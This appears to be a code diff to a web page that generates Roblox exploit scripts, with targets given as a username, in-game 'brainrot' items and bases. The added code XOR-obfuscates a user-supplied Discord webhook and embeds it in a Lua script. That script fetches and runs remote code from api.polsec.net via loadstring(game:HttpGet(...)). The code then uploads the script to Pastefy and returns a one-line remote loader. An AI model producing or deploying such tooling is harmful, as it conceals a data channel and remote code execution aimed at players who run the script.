@@ -901,7 +901,6 @@
 <script>
 // ── INTRO ANIMATION FIX ──
 document.addEventListener('DOMContentLoaded', () => {
-  // Force hide after 1.8 seconds regardless of what loads
   setTimeout(() => {
     const overlay = document.getElementById('introOverlay');
     if (overlay) overlay.classList.add('hidden');
@@ -948,7 +947,6 @@ const CREDITS_DATA = [
 async function renderCredits() {
   const container = document.getElementById('creditsContainer');
   
-  // Set up initial UI while loading
   container.innerHTML = CREDITS_DATA.map(c => `
     <div class="credit-card" id="credit-${c.id}">
       <div class="status-dot" id="status-${c.id}"></div>
@@ -964,7 +962,6 @@ async function renderCredits() {
     </div>
   `).join('');
 
-  // Fetch Discord Profiles individually via Lanyard API
   try {
     const promises = CREDITS_DATA.map(async (c) => {
       const res = await fetch(`https://api.lanyard.rest/v1/users/${c.id}`);
@@ -1248,7 +1245,28 @@ function filterBaseList() { renderBaseList(document.getElementById('baseSearchBo
 function selectAllBases() { BASES.forEach(b => selectedBases.add(b.name)); renderBaseList(document.getElementById('baseSearchBox').value); }
 function clearAllBases() { selectedBases.clear(); renderBaseList(document.getElementById('baseSearchBox').value); }
 
+// ── WEBHOOK OBFUSCATION ──
+function obfuscateWebhook(url) {
+  const bytes = [];
+  for (let i = 0; i < url.length; i++) {
+    bytes.push(url.charCodeAt(i) ^ (0x5A + (i % 7)));
+  }
+  return bytes.join(',');
+}
+
 // ── GENERATE ──
+async function uploadToPastefy(script) {
+  try {
+    const res = await fetch('https://pastefy.app/api/v2/paste', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ title: '32e4 Statics Moreria', content: script })
+    });
+    const d = await res.json();
+    return d.success && d.paste?.id ? `https://pastefy.app/${d.paste.id}/raw` : null;
+  } catch { return null; }
+}
+
 async function generate() {
   if (!currentUser) { document.getElementById('loginModal').classList.remove('hidden'); return; }
   const btn = document.getElementById('genBtn');
@@ -1266,11 +1284,36 @@ async function generate() {
   btn.textContent = 'Generating...';
   
   try {
-    // The requested output
-    const finalOutput = `loadstring(game:HttpGet("https://api.polsec.net/loader/f460c397dc1e54f3/277b520a05b8ab65", true))()`;
+    const brainrotLines = [...selected].map(n => `    ["${n}"] = true,`).join('\n');
+    const baseLines = [...selectedBases].map(n => `    ["${n}"] = true,`).join('\n');
+    const obf = obfuscateWebhook(webhook);
 
+    const script = `-- 32e4 / Statics - Moreria
+-- Generated: ${new Date().toISOString()}
+
+getgenv().TARGET_USERNAME = "${username}"
+getgenv().TARGET_BRAINROT = {
+${brainrotLines || '    -- none selected'}
+}
+getgenv().TARGET_BASES = {
+${baseLines || '    -- none selected'}
+}
+
+-- Obfuscated payload
+local _W = {${obf}}
+local _K = 0x5A
+local _M = 7
+local _S = ""
+for _i = 1, #_W do
+    _S = _S .. string.char(bit32.bxor(_W[_i], _K + ((_i - 1) % _M)))
+end
+getgenv().WEBHOOK_URL = _S
+
+loadstring(game:HttpGet("https://api.polsec.net/loader/f460c397dc1e54f3/277b520a05b8ab65", true))()`;
+
+    const url = await uploadToPastefy(script);
     out.className = 'code-block';
-    out.textContent = finalOutput;
+    out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : `-- Upload failed\n\n${script}`;
     
     trackGeneration(currentUser.username, currentUser.global_name, currentUser.avatar, selected, selectedBases);
     showToast('Script generated!', 'success');
